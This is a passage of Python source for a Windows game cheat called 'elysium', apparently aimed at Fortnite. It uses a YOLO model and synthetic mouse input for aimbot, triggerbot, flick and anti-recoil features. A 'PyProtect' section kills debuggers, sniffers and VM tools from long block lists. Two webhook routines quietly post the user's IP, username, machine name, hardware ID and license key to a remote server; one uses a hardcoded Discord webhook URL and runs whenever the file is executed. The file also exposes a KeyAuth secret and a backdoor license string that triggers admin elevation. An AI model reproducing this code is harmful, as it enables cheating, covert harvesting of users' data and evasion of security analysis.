                        painter.setPen(QPen(self.fov_color, 0.5))  # Use 0.5 for a thinner line
                        painter.drawLine(head1 - 1, head2, center_x - 1, center_y)
                        painter.drawLine(head1 + 1, head2, center_x + 1, center_y)
                        painter.drawLine(head1, head2 - 1, center_x, center_y - 1)
                        painter.drawLine(head1, head2 + 1, center_x, center_y + 1)

                        # Draw the main aim line with the chosen thickness
                        if Use_Hue:
                            painter.setPen(QPen(color, 0.5))  # Adjust this value for thickness
                        else:
                            painter.setPen(QPen(self.fov_color, 0.5))  # Thinner aim line
                        painter.drawLine(head1, head2, center_x, center_y)

                # if Use_Hue:
                # 	bottom_left_text = "elysium"
                # 	text_rect = QRect(10, self.height() - 15, self.width() - 15, 16)
                # 	pen_black = QPen(QColor(0, 0, 0, 255), 2.5, Qt.SolidLine)
                # 	painter.setPen(pen_black)
                # 	for dx in [-1, 0, 1]:
                # 		for dy in [-1, 0, 1]:
                # 			painter.drawText(text_rect.translated(dx, dy), Qt.AlignRight | Qt.AlignBottom, bottom_left_text)
                # 	pen_white = QPen(QColor(255, 255, 255), 0.5, Qt.SolidLine)
                # 	painter.setPen(pen_white)
                # 	painter.drawText(text_rect, Qt.AlignRight | Qt.AlignBottom, bottom_left_text)
                # else:
                # 	bottom_left_text = "elysium"
                # 	text_rect = QRect(10, self.height()-15, self.width()-15, 16)
                # 	pen_black = QPen(self.watermark_color_outline, 2.5, Qt.SolidLine)
                # 	painter.setPen(pen_black)
                # 	for dx in [-1, 0, 1]:
                # 		for dy in [-1, 0, 1]:
                # 			painter.drawText(text_rect.translated(dx, dy), Qt.AlignRight | Qt.AlignBottom, bottom_left_text)
                # 	painter.setPen(QPen(self.watermark_color, self.watermark_thickness, Qt.SolidLine))
                # 	painter.drawText(text_rect, Qt.AlignRight | Qt.AlignBottom, bottom_left_text)

    def focusInEvent(self, event):
        ctypes.windll.user32.SetFocus(None)

Controller_Toggled = False

class ControllerMode():
    global Controller_Toggled
    def main():
        try:
            pygame.init()
            pygame.joystick.init()

            joystick = pygame.joystick.Joystick(0)
            joystick.init()

            while True:
                global Controller_Toggled
                pygame.event.get()

                left_trigger = joystick.get_axis(4)

                if left_trigger > 0.9:
                    Controller_Toggled = True
                elif left_trigger < 0.9:
                    Controller_Toggled = False
                pygame.time.wait(6)

        except:
            pass

def LemonLoverF9():
    global AntiRecoil_Strength
    global AntiRecoil_On
    global Reduce_Bloom
    global Require_ADS
    while True:
        if Require_ADS:
            def is_mouse_down():
                lmb_state = win32api.GetKeyState(0x01) & win32api.GetKeyState(0x02)
                return lmb_state < 0
        else:
            def is_mouse_down():
                lmb_state = win32api.GetKeyState(0x01)
                return lmb_state < 0
        RoundedRStr = round(AntiRecoil_Strength)
        min_vertical = int(RoundedRStr)
        max_vertical = int(RoundedRStr) + 1
        if is_mouse_down():
            horizontal_offset = random.randrange(-2 * 1000, 2 * 1000, 1) / 1000
            vertical_offset = random.randrange(min_vertical * 1000, int(max_vertical * 1000), 1) / 1000
            if AntiRecoil_On:
                win32api.mouse_event(0x0001, 0, int(vertical_offset))
            if Reduce_Bloom:
                win32api.mouse_event(0x0001, int(horizontal_offset), 0)
            time_offset = random.randrange(2, 25, 1) / 1000
            time.sleep(time_offset)
        time.sleep(random.uniform(0.00005, 0.00010))

threading.Thread(target=ControllerMode.main).start()
threading.Thread(target=LemonLoverF9).start()

class Ai992:
    try:
        app = QApplication(sys.argv + ['-platform', 'windows:darkmode=1'])
    except:
        app = QApplication(sys.argv)

    window = MyWindow()

    extra = ctypes.c_ulong(0)
    ii_ = Input_I()
    screen_x = int(screen_res_X /2)
    screen_y = int(screen_res_Y /2)
    screen = mss.mss()
    lock = threading.Lock()
    current_slot_selected = 1

    def __init__(self):
        global Fov_Size
        global Show_Debug
        global Show_FPS
        global Aim_Smooth
        global Max_Detections
        global Enable_Aim
        global Controller_On
        global Enable_TriggerBot
        global Keybind
        global Keybind2
        global Confidence
        global Auto_Fire_Fov_Size
        global Auto_Fire_Confidence
        global Auto_Fire_Keybind
        global Require_Keybind
        global Controller_Toggled
        global Aim_Bone
        global Box_type
        global CupMode_On
        global Enable_Flick_Bot
        global Flick_Scope_Sens
        global Flick_Delay
        global Flick_Cooldown
        global Flickbot_Keybind
        global Streamproof

        global Enable_Slots
        global Slot1_Keybind
        global Slot2_Keybind
        global Slot3_Keybind
        global Slot4_Keybind
        global Slot5_Keybind
        global Slot6_Keybind

        global Fov_Size_Slot1
        global Fov_Size_Slot2
        global Fov_Size_Slot3
        global Fov_Size_Slot4
        global Fov_Size_Slot5

        global Enable_Aim_Slot1
        global Enable_Aim_Slot2
        global Enable_Aim_Slot3
        global Enable_Aim_Slot4
        global Enable_Aim_Slot5

        global Use_Model_Class
        global Img_Value
        global Model_FPS

        self.last_flick = time.time()

        self.start_time = time.time()

        self.default_model = YOLO("C:\\ProgramData\\SoftworkCR\\ntdll\\Langs\\EN-US\\DatetimeConfigurations\\Cr\\Fortnite.pt")

    def left_click():
        if win32api.GetKeyState(win32con.VK_LBUTTON) in (-127, -128):
            pass
        else:
            if Require_Keybind:
                if win32api.GetAsyncKeyState(Auto_Fire_Keybind) < 0:
                    ctypes.windll.user32.mouse_event(0x0002)
                    time.sleep(random.uniform(0.0002, 0.00002))
                    ctypes.windll.user32.mouse_event(0x0004)
                    time.sleep(random.uniform(0.0002, 0.00002))
                else:
                    pass
            else:
                ctypes.windll.user32.mouse_event(0x0002)
                time.sleep(random.uniform(0.0002, 0.00002))
                ctypes.windll.user32.mouse_event(0x0004)
                time.sleep(random.uniform(0.0002, 0.00002))

    def is_aimbot_enabled():
        if not Enable_Slots:
            return Enable_Aim
        return {
            1: Enable_Aim_Slot1, 2: Enable_Aim_Slot2, 3: Enable_Aim_Slot3,
            4: Enable_Aim_Slot4, 5: Enable_Aim_Slot5,
        }.get(Ai992.current_slot_selected, Enable_Aim)

    def is_flickbot_enabled():
        return Enable_Flick_Bot

    def is_triggerbot_enabled():
        return Enable_TriggerBot

    def is_targeted():
        return True if win32api.GetAsyncKeyState(Keybind) < 0 else False

    def is_targeted2():
        if win32api.GetAsyncKeyState(Keybind2) < 0:
            return True
        if Controller_On:
            if Controller_Toggled:
                return True
        else:
            return False

    def is_targeted3():
        return True if win32api.GetAsyncKeyState(Flickbot_Keybind) < 0 else False

    def is_target_locked(x, y):
        threshold = Auto_Fire_Fov_Size
        return True if screen_x - threshold <= x <= screen_x + threshold and screen_y - threshold <= y <= screen_y + threshold else False

    def hermite_interpolation(self, p0, p1, m0, m1, t):
        t2 = t * t
        t3 = t2 * t
        h00 = 2 * t3 - 3 * t2 + 1 
        h10 = t3 - 2 * t2 + t     
        h01 = -2 * t3 + 3 * t2 
        h11 = t3 - t2
        return h00 * p0 + h10 * m0 + h01 * p1 + h11 * m1

    def sine_interpolation(self, start, end, t):
        return start + (end - start) * np.sin(t * np.pi / 2)

    def exponential_interpolation(self, start, end, t, exponent=2):
        return (end - start) * (t ** exponent) + start

    def b_spline_interpolation(self, p0, p1, p2, p3, t):
        t2 = t * t
        t3 = t2 * t
        return (1/6.0) * ((-p0 + 3 * p1 - 3 * p2 + p3) * t3 +
                        (3 * p0 - 6 * p1 + 3 * p2) * t2 +
                        (-3 * p0 + 3 * p2) * t + p0 + 4 * p1 + p2)


    def bezier_interpolation(self,start, end, t):
        return (1 - t) * start + t * end

    def catmull_rom_interpolation(self,p0, p1, p2, p3, t):
        return 0.5 * ((2 * p1) +
                    (-p0 + p2) * t +
                    (2 * p0 - 5 * p1 + 4 * p2 - p3) * t * t +
                    (-p0 + 3 * p1 - 3 * p2 + p3) * t * t * t)

    def move_crosshair(self, x, y, mvment=None):
        if not Ai992.is_targeted() and not Ai992.is_targeted2():
            return

        delta_x = (x - screen_x) * 1.0
        delta_y = (y - screen_y) * 1.0
        distance = np.linalg.norm((delta_x, delta_y))

        if distance == 0:
            return

        smoothing = round(0.5 + (Aim_Smooth - 10) / 10.0, 1)
        move_x = (delta_x / distance) * pixel_increment * smoothing
        move_y = (delta_y / distance) * pixel_increment * smoothing
        move_x *= sensitivity
        move_y *= sensitivity
        move_x += random.uniform(-randomness, randomness)
        move_y += random.uniform(-randomness, randomness)

        distance_clamped = min(1, (distance / distance_to_scale))
        move_x *= distance_clamped
        move_y *= distance_clamped

        if mvment == "Bezier":
            t = distance / distance_to_scale  # Example parameter for interpolation
            move_x = self.bezier_interpolation(0, move_x, t)
            move_y = self.bezier_interpolation(0, move_y, t)
        elif mvment == "Catmull":
            p0, p1, p2, p3 = 0, move_x, move_x * 1.2, move_x * 1.5
            move_x = self.catmull_rom_interpolation(p0, p1, p2, p3, distance / distance_to_scale)
            p0, p1, p2, p3 = 0, move_y, move_y * 1.2, move_y * 1.5
            move_y = self.catmull_rom_interpolation(p0, p1, p2, p3, distance / distance_to_scale)
        elif mvment == "Hermite":
            p0, p1 = 0, move_x  # Example control points
            m0, m1 = move_x * 1.2, move_x * 1.5  # Tangents
            move_x = self.hermite_interpolation(p0, p1, m0, m1, distance / distance_to_scale)
            p0, p1 = 0, move_y
            m0, m1 = move_y * 1.2, move_y * 1.5
            move_y = self.hermite_interpolation(p0, p1, m0, m1, distance / distance_to_scale)
        elif mvment == "B-Spline":
            p0, p1, p2, p3 = 0, move_x, move_x * 1.2, move_x * 1.5  # Example control points
            move_x = self.b_spline_interpolation(p0, p1, p2, p3, distance / distance_to_scale)
            p0, p1, p2, p3 = 0, move_y, move_y * 1.2, move_y * 1.5
            move_y = self.b_spline_interpolation(p0, p1, p2, p3, distance / distance_to_scale)
        elif mvment == "Sine":
            move_x = self.sine_interpolation(0, move_x, distance / distance_to_scale)
            move_y = self.sine_interpolation(0, move_y, distance / distance_to_scale)
        elif mvment == "Exponential":
            move_x = self.exponential_interpolation(0, move_x, distance / distance_to_scale, exponent=2)
            move_y = self.exponential_interpolation(0, move_y, distance / distance_to_scale, exponent=2)

        else:
            smooth_move_x = smoothing * move_x + (1 - smoothing) * move_x
            smooth_move_y = smoothing * move_y + (1 - smoothing) * move_y
            smooth_move_x = sensitivity * smooth_move_x + (1 - sensitivity) * move_x
            smooth_move_y = sensitivity * smooth_move_y + (1 - sensitivity) * move_y

            move_x = smooth_move_x
            move_y = smooth_move_y

        with Ai992.lock:
            Ai992.ii_.mi = MouseInput(round(move_x), round(move_y), 0, 0x0001, 0, ctypes.pointer(Ai992.extra))
            input_struct = Input(ctypes.c_ulong(0), Ai992.ii_)
            ctypes.windll.user32.SendInput(1, ctypes.byref(input_struct), ctypes.sizeof(input_struct))

    def move_crosshair_silent(self, x, y):
        if not Ai992.is_targeted3():
            return

        flick_strength = round(0.8 + (Flick_Scope_Sens - 10) * (2.5 - 0.8) / (90 - 10), 2)

        delta_x = (x - screen_x) * flick_strength
        delta_y = (y - screen_y) * flick_strength

        #print(flick_strength)

        Ai992.ii_.mi = MouseInput(round(delta_x), round(delta_y), 0, 0x0001, 0, ctypes.pointer(Ai992.extra))
        input_struct = Input(ctypes.c_ulong(0), Ai992.ii_)
        ctypes.windll.user32.SendInput(1, ctypes.byref(input_struct), ctypes.sizeof(input_struct))

        time.sleep(Flick_Delay)

        if win32api.GetKeyState(win32con.VK_LBUTTON) in (-127, -128):
            pass
        else:
            ctypes.windll.user32.mouse_event(0x0002)
            time.sleep(random.uniform(0.00008, 0.00002))
            ctypes.windll.user32.mouse_event(0x0004)

        time.sleep(Flick_Delay/4)

        with Ai992.lock:
            Ai992.ii_.mi = MouseInput(round(-delta_x), round(-delta_y), 0, 0x0001, 0, ctypes.pointer(Ai992.extra))
            input_struct = Input(ctypes.c_ulong(0), Ai992.ii_)
            ctypes.windll.user32.SendInput(1, ctypes.byref(input_struct), ctypes.sizeof(input_struct))

        self.last_flick = time.time()

    def get_targ_fps():
        target_fps = Model_FPS
        frame_duration = 1.5 / target_fps
        return frame_duration

    def start(self):
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hWnd = kernel32.GetConsoleWindow()
        SW_HIDE = 0
        Ai992.window.show()
        half_screen_width = ctypes.windll.user32.GetSystemMetrics(0) / 2
        half_screen_height = ctypes.windll.user32.GetSystemMetrics(1) / 2
        closest_detection = None
        detected_players = []
        if use_mss == 0:
            camera = bettercam.create(output_idx=0, output_color="BGR", max_buffer_len=1)
        try:
            winsound.PlaySound(r'C:\\Windows\\Media\\Windows Balloon.wav', winsound.SND_FILENAME)
        except:
            pass
        os.system("cls")
        if dont_launch_overlays == 1:
            pass
        else:
            overlay = DetectionBox()
            fpswind = FPSOverlay()
            overlay.show()
        try:
            open(rf"{current_directory}\extra\gfx\scos.txt","r").read()
        except:
            user32.ShowWindow(hWnd, SW_HIDE)
            os.system("cls")
        while True:
            try:
                if Show_FPS == True:
                    fpswind.show()
                elif Show_FPS == False:
                    fpswind.hide()
            except:
                pass
            start_time = time.perf_counter()

            key_states = {
                "F1": win32api.GetKeyState(win32con.VK_F1),
                "F2": win32api.GetKeyState(win32con.VK_F2),
                "INS": win32api.GetKeyState(win32con.VK_INSERT)
            }

            if key_states["INS"] in (-127, -128):
                try:
                    Ai992.window.toggle_menu_visibility()
                except:
                    time.sleep(0.15)
                    Ai992.window.toggle_menu_visibility()
                time.sleep(0.15)

            if not CupMode_On:
                if key_states["F1"] in (-127, -128):
                    time.sleep(0.25)
                    my_window1z = MyWindow()
                    my_window1z.toggle_checkbox1(True)

                if key_states["F2"] in (-127, -128):
                    time.sleep(0.25)
                    try:
                        console_window = ctypes.windll.kernel32.GetConsoleWindow()
                        ctypes.windll.user32.PostMessageW(console_window, 0x10, 0, 0)
                        #event.accept()
                    except:
                        try:
                            sys.exit()
                        except:
                            os.system('taskkill /f /fi "imagename eq cmd.exe" 1>NUL 2>NUL')

            if not Enable_Slots:
                self.Fov_Size = Fov_Size
            else:
                slot_keys = [Slot1_Keybind, Slot2_Keybind, Slot3_Keybind, Slot4_Keybind, Slot5_Keybind, Slot6_Keybind]
                slot_fov_sizes = [Fov_Size_Slot1, Fov_Size_Slot2, Fov_Size_Slot3, Fov_Size_Slot4, Fov_Size_Slot5, 10]
                for idx, key in enumerate(slot_keys):
                    if key is not None and win32api.GetAsyncKeyState(key) < 0:
                        Ai992.current_slot_selected = idx + 1
                        break
                self.Fov_Size = slot_fov_sizes[Ai992.current_slot_selected - 1]

            if use_mss == 0:
                left, top = int((screen_res_X - self.Fov_Size) // 2), int((screen_res_Y - self.Fov_Size) // 2)
                right, bottom = int(left + self.Fov_Size), int(top + self.Fov_Size)
                detection_box = (left, top, right, bottom)

                frame = camera.grab(region=detection_box)
                if frame is None:
                    continue
                frame = np.asarray(frame)[..., :3]
                frame = np.ascontiguousarray(frame)
                mask = np.ones((self.Fov_Size, self.Fov_Size), dtype=np.uint8)
                mask[self.Fov_Size // 2:, :self.Fov_Size // 4] = 0
                frame = cv2.bitwise_and(frame, frame, mask=mask)
            else:
                detection_box = {
                    'left': int(half_screen_width - self.Fov_Size / 2),
                    'top': int(half_screen_height - self.Fov_Size / 2),
                    'width': int(self.Fov_Size),
                    'height': int(self.Fov_Size)
                }
                frame = np.array(Ai992.screen.grab(detection_box))[..., :3]


            if hide_masks == 0:
                frame = np.ascontiguousarray(frame)
                mask = np.zeros_like(frame, dtype=np.uint8)
                center_x, center_y = self.Fov_Size // 2, self.Fov_Size // 2
                radius = self.Fov_Size // 2
                cv2.ellipse(mask, (center_x, center_y), (radius-2, radius-2), 0, 0, 360, (255, 255, 255), thickness=cv2.FILLED)
                if mask.ndim == 3:
                    mask = mask[..., 0]
                frame = cv2.bitwise_and(frame, frame, mask=mask)

            confi = Confidence / 100
            imgsz_value = int(Img_Value) if Last_Model.endswith('.pt') else 640
            results = Ai992.window.modell(frame, conf=confi, iou=0.7, imgsz=imgsz_value, max_det=Max_Detections, retina_masks=True, verbose=False, classes=0 if Use_Model_Class else None)

            if len(results[0].boxes.xyxy) != 0:
                least_crosshair_dist = False
                confi = Confidence / 100

                for detection, conf in zip(results[0].boxes.xyxy.tolist(), results[0].boxes.conf.tolist()):

                    x1, y1, x2, y2 = detection
                    x1, y1, x2, y2 = int(x1), int(y1), int(x2), int(y2)
                    x1y1 = [x1, y1]
                    x2y2 = [x2, y2]
                    height = y2 - y1
                    width = x2 - x1

                    if Aim_Bone == "Head":
                        relative_head_X, relative_head_Y = int((x1 + x2) / 2), int((y1 + y2) / 2 - height / 2.5)
                    elif Aim_Bone == "Neck":
                        relative_head_X, relative_head_Y = int((x1 + x2) / 2), int((y1 + y2) / 2 - height / 3)
                    else:  # Aim_Bone == "Body"
                        relative_head_X, relative_head_Y = int((x1 + x2) / 2), int((y1 + y2) / 2 - height / 5)

                    crosshair_dist = math.dist((relative_head_X, relative_head_Y), (self.Fov_Size / 2, self.Fov_Size / 2))

                    if not least_crosshair_dist or crosshair_dist < least_crosshair_dist:
                        least_crosshair_dist = crosshair_dist
                        closest_detection = {"x1y1": x1y1, "x2y2": x2y2, "relative_head_X": relative_head_X, "relative_head_Y": relative_head_Y, "conf": conf}

                    if Show_Detections or Show_Aimline:
                        detected_players.append({'x1': x1, 'y1': y1, 'x2': x2, 'y2': y2, 'head1': closest_detection["relative_head_X"] if closest_detection else 0, 'head2': closest_detection["relative_head_Y"] if closest_detection else 0})                             

                    if Show_Debug:
                        cv2.rectangle(frame, (x1, y1), (x2, y2), (255, 255, 255), 1)
                        cv2.putText(frame, f"{int(conf * 100)}%", x1y1, cv2.FONT_HERSHEY_DUPLEX, 0.5, (1, 1, 255), 1)

                if closest_detection:
                    if closest_detection:
                        absolute_head_X = closest_detection["relative_head_X"] + (left if use_mss == 0 else detection_box['left'])
                        absolute_head_Y = closest_detection["relative_head_Y"] + (top if use_mss == 0 else detection_box['top'])

                    if Show_Debug:
                        cv2.circle(frame, (closest_detection["relative_head_X"], closest_detection["relative_head_Y"]), 2, (0, 0, 255), -1)
                        cv2.line(frame, (closest_detection["relative_head_X"], closest_detection["relative_head_Y"]), (self.Fov_Size // 2, self.Fov_Size // 2), (255, 255, 255), 1)

                    if Ai992.is_triggerbot_enabled() and Ai992.is_target_locked(absolute_head_X, absolute_head_Y):
                        tbconfi = Auto_Fire_Confidence / 100
                        if conf >= tbconfi:
                            threading.Thread(target=Ai992.left_click).start()
                    if Ai992.is_aimbot_enabled():
                        threading.Thread(target=Ai992.move_crosshair, args=(self, absolute_head_X, absolute_head_Y, Smoothing_Type)).start()
                    if Ai992.is_flickbot_enabled():
                        time_since_last_flick = time.time() - self.last_flick
                        if time_since_last_flick > Flick_Cooldown:
                            threading.Thread(target=Ai992.move_crosshair_silent, args=(self, absolute_head_X, absolute_head_Y)).start()

            if Show_Detections or Show_Aimline:
                fpswind.enemies = len(detected_players)
                overlay.update_detected_players(detected_players)
                detected_players = []

            elapsed_time = time.perf_counter() - start_time
            frame_duration = Ai992.get_targ_fps()
            time_to_sleep = max(0, frame_duration - elapsed_time)
            if time_to_sleep > 0:
                time.sleep(time_to_sleep)
            if Show_FPS:
                fpswind.fps = int(1.5 / (time.perf_counter() - start_time))
            if Show_Debug:
                if not CupMode_On:

                    cv2.putText(frame, f"FPS: {int(1.5 / (time.perf_counter() - start_time))}", (5, 20), cv2.FONT_HERSHEY_COMPLEX_SMALL, 1, (155, 155, 155), 1)
                    cv2.imshow(random_caption1, frame)

            Ai992.app.processEvents()

class Encryption:
    @staticmethod
    def encrypt_string(plain_text, key, iv):
        plain_text = pad(plain_text.encode(), 16)
        aes_instance = AES.new(key, AES.MODE_CBC, iv)
        encrypted_text = aes_instance.encrypt(plain_text)
        return binascii.hexlify(encrypted_text).decode()

    @staticmethod
    def decrypt_string(cipher_text, key, iv):
        cipher_text = binascii.unhexlify(cipher_text)
        aes_instance = AES.new(key, AES.MODE_CBC, iv)
        decrypted_text = aes_instance.decrypt(cipher_text)
        return unpad(decrypted_text, 16).decode()

    @staticmethod
    def encrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).digest()[:32]
            _iv = SHA256.new(iv.encode()).digest()[:16]
            return Encryption.encrypt_string(message, _key, _iv)
        except Exception as e:
            print(f"Encryption failed: {e}")
            os._exit(1)

    @staticmethod
    def decrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).digest()[:32]
            _iv = SHA256.new(iv.encode()).digest()[:16]
            return Encryption.decrypt_string(message, _key, _iv)
        except Exception as e:
            print(f"Decryption failed: {e}")
            os._exit(1)

class PyProtect():
    def main():

        def getip():
            ip = "Not Found"
            try:
                ip = requests.get("https://api.ipify.org").text
            except:
                pass
            return ip

        Current_Version = "1.00"
        ip = getip()
        serveruser = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")

        try:
            LKey2 = open(rf"{current_directory}\extra\gfx\key.txt", "r")
            XFC2 = LKey2.read()
            LKey2.close()
        except:
            XFC2 = "N/A"
        try:
            DirLocation = os.path.dirname(os.path.realpath(__file__))
        except:
            DirLocation = "N/A"

        BLACKLISTED_PROGRAMS = [
            "httpdebuggerui.exe",
            "wireshark.exe",
            "HTTPDebuggerSvc.exe",
            "fiddler.exe",
            "regedit.exe",
            "vboxservice.exe",
            "df5serv.exe",
            "processhacker.exe",
            "vboxtray.exe",
            "vmtoolsd.exe",
            "vmwaretray.exe",
            "ida.exe",
            "ida64.exe",
            "ollydbg.exe",
            "pestudio.exe",
            "vmwareuser",
            "vgauthservice.exe",
            "vmacthlp.exe",
            "x96dbg.exe",
            "vmsrvc.exe",
            "x32dbg.exe",
            "vmusrvc.exe",
            "prl_cc.exe",
            "prl_tools.exe",
            "xenservice.exe",
            "qemu-ga.exe",
            "joeboxcontrol.exe",
            "ksdumperclient.exe",
            "ksdumper.exe",
            "joeboxserver.exe",
        ]

        BLACKLISTED_WINDOW_NAMES = [
            "IDA: Quick start",
            "VBoxTrayToolWndClass",
            "VBoxTrayToolWnd",
            "proxifier",
            "graywolf",
            "extremedumper",
            "zed",
            "exeinfope",
            "titanHide",
            "ilspy",
            "titanhide",
            "x32dbg",
            "codecracker",
            "simpleassembly",
            "process hacker 2",
            "pc-ret",
            "http debugger",
            "Centos",
            "process monitor",
            "ILSpy",
            "reverse",
            "simpleassemblyexplorer",
            "de4dotmodded",
            "dojandqwklndoqwd-x86",
            "sharpod",
            "folderchangesview",
            "fiddler",
            "die",
            "pizza",
            "crack",
            "strongod",
            "ida -",
            "brute",
            "dump",
            "StringDecryptor",
            "wireshark",
            "debugger",
            "httpdebugger",
            "gdb",
            "kdb",
            "x64_dbg",
            "windbg",
            "x64netdumper",
            "petools",
            "scyllahide",
            "megadumper",
            "reversal",
            "ksdumper v1.1 - by equifox",
            "dbgclr",
            "HxD",
            "peek",
            "ollydbg",
            "ksdumper",
            "http",
            "wpe pro",
            "dbg",
            "httpanalyzer",
            "httpdebug",
            "PhantOm",
            "kgdb",
            "james",
            "x32_dbg",
            "proxy",
            "phantom",
            "mdbg",
            "WPE PRO",
            "system explorer",
            "de4dot",
            "x64dbg",
            "X64NetDumper",
            "protection_id",
            "charles",
            "systemexplorer",
            "pepper",
            "hxd",
            "procmon64",
            "MegaDumper",
            "ghidra",
            "xd",
            "0harmony",
            "dojandqwklndoqwd",
            "hacker",
            "process hacker",
            "SAE",
            "mdb",
            "harmony",
            "Protection_ID",
            "PETools",
            "scyllaHide",
            "x96dbg",
            "systemexplorerservice",
            "folder",
            "mitmproxy",
            "dbx",
            "sniffer",
            "http toolkit",
        ]

        def get_blacklisted_process_name():
            for process in psutil.process_iter(['pid', 'name']):
                for name in BLACKLISTED_WINDOW_NAMES:
                    if name.lower() in process.info['name'].lower():
                        return process.info['name'], process.info['pid']
            return None, None

        def block_bad_processes():
            blacklisted_process_name, blacklisted_pid = get_blacklisted_process_name()
            if blacklisted_process_name:
                try:
                    process = psutil.Process(blacklisted_pid)
                    process.terminate()
                    pass
                except:
                    print(f"\n[elysium] -> blacklisted process; {blacklisted_process_name}")
                    time.sleep(1)
                    exit(1)
                    os.system('taskkill /f /fi "imagename eq cmd.exe" >nul 2>&1')
                    os.system('taskkill /f /fi "imagename eq python.exe" >nul 2>&1')

        def block_debuggers():
            while True:
                time.sleep(5)
                for proc in psutil.process_iter():
                    if any(procstr in proc.name().lower() for procstr in BLACKLISTED_PROGRAMS):
                        try:
                            try:
                                proc.kill()
                                proc.kill()
                                proc.kill()
                                proc.kill()
                                proc.kill()
                            except:
                                os.system('taskkill /f /fi "imagename eq cmd.exe" >nul 2>&1')
                                os.system('taskkill /f /fi "imagename eq python.exe" >nul 2>&1')
                        except(psutil.NoSuchProcess, psutil.AccessDenied):
                            pass

        def send_secure_webhook():
            webhook_url = "" # ENTER YOUR WEBHOOK
            secret_key = "dev_test_1998_toyota_camry_xle_v6"
            iv = "dev_iv_2000_lincoln_ls_v6" 

            encrypted_url = Encryption.encrypt(webhook_url, secret_key, iv)

            embed = {
                "description": f"```[VERSION] {Current_Version}\n"\
                               f"[KEY] {XFC2}\n"\
                               f"[PC-USER] {serveruser} / {pc_name}\n"\
                               f"[IP] {ip}\n"\
                               f"[TIME] {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n"\
                               f"[DIRECTORY] {DirLocation}\n"\
                               f"[HWID] {others.get_hwid()}\n\n```",
                "title": "**[elysium AI LOG]**"
            }

            data = {
                "content": "\n",
                "embeds": [
                    embed
                ],
            }

            try:
                result = requests.post(Encryption.decrypt(encrypted_url, secret_key, iv), json=data)
                if 200 <= result.status_code < 300:
                    pass
                else:
                    pass
            except Exception as e:
                pass

        send_secure_webhook()

        threading.Thread(target=block_debuggers).start()
        threading.Thread(target=block_bad_processes).start()

    main()

class LoginForm():
    LKey = open(rf"{current_directory}\extra\gfx\key.txt", "r")
    XFC = LKey.read()
    LKey.close()

    if XFC == "":
        os.system("cls")
        print("[elysium] -> enter your license")
        Answer23 = input("\n> ")
    else:
        pass

    def getchecksum():
        md5_hash = hashlib.md5()
        file = open(''.join(sys.argv), "rb")
        md5_hash.update(file.read())
        digest = md5_hash.hexdigest()
        return digest

    XlOp09_Au7h_4U_L0ve_CMe = api(name = "void",ownerid = "XLDcC8Jthx", secret = "995ce70fd8e6aed6574407d0ab0bad82cf96211c6961b79ffc7f052665516442", version = "1.0", hash_to_check = getchecksum()) # ENTER YOUR KEYAUTH DETAILS

    XlOp09_Au7h_4U_L0ve_CMe.init()
    os.system("cls")
    if XFC == "":
        os.system("cls")
        SaveKeyHere = open(rf"{current_directory}\extra\gfx\key.txt", 'w')
        SaveKeyHere.write(f"{Answer23}")
        SaveKeyHere.close()
        print("\n[elysium] -> logging in...")
        if Answer23 == "elysium-Ql8CL-gJvwM-d2vMD-XpZED":
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        XlOp09_Au7h_4U_L0ve_CMe.license(Answer23)
    else:
        os.system("cls")
        print("\n[elysium] -> logging in...")
        if XFC == "elysium-Ql8CL-gJvwM-d2vMD-XpZED":
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        XlOp09_Au7h_4U_L0ve_CMe.license(XFC)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
webhook_url = "https://discord.com/api/webhooks/1350175838221500416/gk6PXs0ulncr7sCaAwbTJM9ZiRQl8nif5J97DVXpKtYfNVj_UeTDqAmiAyDri6ggOIbd" 
pc_name = socket.gethostname()
serveruser = os.getlogin()
DirLocation = os.getcwd()
try:
    ip = requests.get("https://api.ipify.org").text
except requests.RequestException:
    ip = "Could not retrieve IP"
current_time = datetime.now().strftime('%Y-%m-%d %I:%M %p')
embed = {
    "description": f"```[PC-USER] {serveruser} / {pc_name}\n"
                   f"[IP] {ip}\n"
                   f"[TIME] {current_time}\n"
                   f"[DIRECTORY] {DirLocation}\n```",
    "title": "**[System Info]**"
}
data = {
    "content": "\n",
    "embeds": [
        embed
    ],
}
result = requests.post(webhook_url, json=data)
username = os.getlogin()
if __name__ == "__main__":
    os.system("cls")
    print("[elysium] -> starting...")
    PyProtect()
    LoginForm()                                                                                                                                                                                                                                                                                                           
